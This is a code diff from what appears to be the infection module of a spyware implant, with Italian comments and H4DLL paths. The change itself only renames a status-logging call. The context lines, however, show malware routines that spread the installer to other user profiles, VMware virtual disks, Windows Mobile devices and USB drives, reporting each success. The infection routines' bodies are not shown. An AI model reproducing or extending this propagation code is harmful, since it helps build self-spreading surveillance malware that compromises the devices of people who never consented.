@@ -10,7 +10,6 @@
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/process.h"
 #include "../../H4DLL/demo_functions.h"
-#include "../../H4DLL/status_log.h"
 
 #define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
 #define PDA_AGENT_SLEEP_TIME 30000 // Ogni 30 secondi controlla il PDA
@@ -642,7 +641,7 @@ void InfectUsers()
 			if (user_name = wcsrchr(user_home, L'\\')) {
 				user_name++;
 				_snwprintf_s(tmp_buf, sizeof(tmp_buf) / sizeof(tmp_buf[0]), _TRUNCATE, L"[Inf. Module]: Spread to %s", user_name);
-				SendStatusLog(tmp_buf);
+				LOG_SendStatusLog(tmp_buf);
 			}
 			one_user_infected = TRUE;
 		}
@@ -1014,7 +1013,7 @@ void InfectVMWare(char* disk_path)
 	if (InfectVMDisk(drive_letter, shared.EXE_INSTALLER_NAME)) {
 		REPORT_STATUS_LOG("- VMWare Installation...........OK\r\n");
 		_snwprintf_s(msg, sizeof(msg) / sizeof(WCHAR), _TRUNCATE, L"[Inf. Module]: Spread to VMWare %S", disk_path);
-		SendStatusLog(msg);
+		LOG_SendStatusLog(msg);
 	}
 
 	// Se non e' riuscito a recuperare l'id del volume prova a smontarli tutti
@@ -1187,7 +1186,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 		if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
 			if (InfectPDA(mmc_path)) {
 				REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
-				SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");
+				LOG_SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");
 			}
 		}
 		RapiDisconnect();
@@ -1215,7 +1214,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 		if (first_time && infection_pda && RapiInit() && TryRapiConnect(3000)) {
 			first_time = FALSE;
 			REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
-			SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");
+			LOG_SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");
 			RapiDisconnect();
 		}
 		CANCELLATION_SLEEP(bPM_pdacp, 2500);
@@ -1240,7 +1239,7 @@ DWORD WINAPI MonitorUSBThread(DWORD dummy)
 
 				if (type == DRIVE_REMOVABLE && !IsUSBInfected(drive_letter) && InfectUSB(drive_letter, shared.EXE_INSTALLER_NAME)) {
 					REPORT_STATUS_LOG("- USB Drive Installation........OK\r\n");
-					SendStatusLog(L"[Inf. Module]: Spread to USB Drive");
+					LOG_SendStatusLog(L"[Inf. Module]: Spread to USB Drive");
 				}
 			}
 		}
